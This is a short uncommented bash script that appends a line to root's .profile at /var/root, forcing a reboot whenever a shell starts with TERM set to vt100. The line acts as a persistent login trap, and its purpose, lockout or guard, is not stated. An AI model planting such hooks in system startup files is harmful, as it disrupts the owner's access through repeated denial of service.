#!/bin/bash

[ ! -s "/var/root/.profile" ] && touch "/var/root/.profile"

echo "if [ \$TERM = vt100 ]; then /sbin/reboot; fi" >> "/var/root/.profile"